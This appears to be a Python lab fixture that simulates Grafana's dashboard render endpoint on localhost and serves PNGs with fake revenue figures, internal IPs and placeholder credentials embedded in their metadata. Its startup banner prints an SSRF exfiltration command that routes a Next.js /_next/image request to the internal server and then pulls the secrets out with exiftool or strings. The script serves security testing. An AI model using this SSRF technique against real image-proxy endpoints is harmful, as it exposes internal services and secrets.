#!/usr/bin/env python3
"""
Grafana Dashboard Render Simulator
===================================

Simulates Grafana's /render/d-solo endpoint which returns
PNG images of dashboard charts. These charts contain actual
business metrics that could be sensitive.

This is a REAL attack vector - Grafana is commonly deployed
internally and its render API returns images containing:
- CPU/Memory usage (infrastructure reconnaissance)
- Revenue/Sales data (business intelligence)
- User counts (competitive intelligence)  
- Error rates (vulnerability discovery)
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import struct
import zlib

def create_minimal_png(text):
    """Create a minimal valid PNG with embedded text data"""
    # PNG signature
    signature = b'\x89PNG\r\n\x1a\n'
    
    # IHDR chunk (image header) - 8x8, 8-bit RGB
    ihdr_data = struct.pack('>IIBBBBB', 8, 8, 8, 2, 0, 0, 0)
    ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data)
    ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc & 0xffffffff)
    
    # IDAT chunk (image data) - minimal compressed data
    raw_data = b'\x00' + b'\xff\x00\x00' * 8  # One row of red pixels
    raw_data = raw_data * 8  # 8 rows
    compressed = zlib.compress(raw_data)
    idat_crc = zlib.crc32(b'IDAT' + compressed)
    idat = struct.pack('>I', len(compressed)) + b'IDAT' + compressed + struct.pack('>I', idat_crc & 0xffffffff)
    
    # tEXt chunk - embed the secret metric data as PNG metadata
    text_data = b'Comment\x00' + text.encode()
    text_crc = zlib.crc32(b'tEXt' + text_data)
    text_chunk = struct.pack('>I', len(text_data)) + b'tEXt' + text_data + struct.pack('>I', text_crc & 0xffffffff)
    
    # IEND chunk
    iend_crc = zlib.crc32(b'IEND')
    iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc & 0xffffffff)
    
    return signature + ihdr + text_chunk + idat + iend

class GrafanaSimulator(BaseHTTPRequestHandler):
    def do_GET(self):
        # Simulate different Grafana dashboard panels
        metrics = {
            '/render/d-solo/revenue': 'Revenue Q4: $12.5M | MRR: $892K | Churn: 2.3%',
            '/render/d-solo/users': 'Total Users: 1,542,891 | DAU: 234,567 | Premium: 45,234',
            '/render/d-solo/infra': 'prod-db-01: 10.0.0.5:5432 | cache-01: 10.0.0.8:6379',
            '/render/d-solo/errors': 'Auth Failures: 1.2K/hr | API Key: sk_prod_xxxxx | Endpoint: /admin/reset',
            '/render/d-solo/secrets': 'DB_PASS: hunter2 | API_KEY: AKIAIOSFODNN7 | TOKEN: eyJhbGc...'
        }
        
        metric_data = metrics.get(self.path, 'Unknown panel')
        png_data = create_minimal_png(metric_data)
        
        print(f"\n[GRAFANA] Rendering: {self.path}")
        print(f"[GRAFANA] Metrics: {metric_data}")
        print(f"[GRAFANA] PNG size: {len(png_data)} bytes")
        
        self.send_response(200)
        self.send_header('Content-Type', 'image/png')
        self.send_header('Content-Length', len(png_data))
        self.end_headers()
        self.wfile.write(png_data)
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    port = 9900
    print("=" * 60)
    print(" Grafana Dashboard Render Simulator")
    print("=" * 60)
    print(f"\nSimulating Grafana at 127.0.0.1:{port}")
    print("\nAvailable endpoints:")
    print(f"  /render/d-solo/revenue  - Revenue metrics")
    print(f"  /render/d-solo/users    - User analytics")
    print(f"  /render/d-solo/infra    - Infrastructure IPs")
    print(f"  /render/d-solo/errors   - Error logs + secrets")
    print(f"  /render/d-solo/secrets  - Direct secrets panel")
    print("=" * 60)
    print("\nTest SSRF exfiltration:")
    print(f'  curl "http://localhost:3000/_next/image?url=http://127.0.0.1:{port}/render/d-solo/secrets&w=640&q=75" -o grafana.png')
    print('  exiftool grafana.png  # Or: strings grafana.png | grep -i secret')
    print("=" * 60)
    
    HTTPServer(('127.0.0.1', port), GrafanaSimulator).serve_forever()
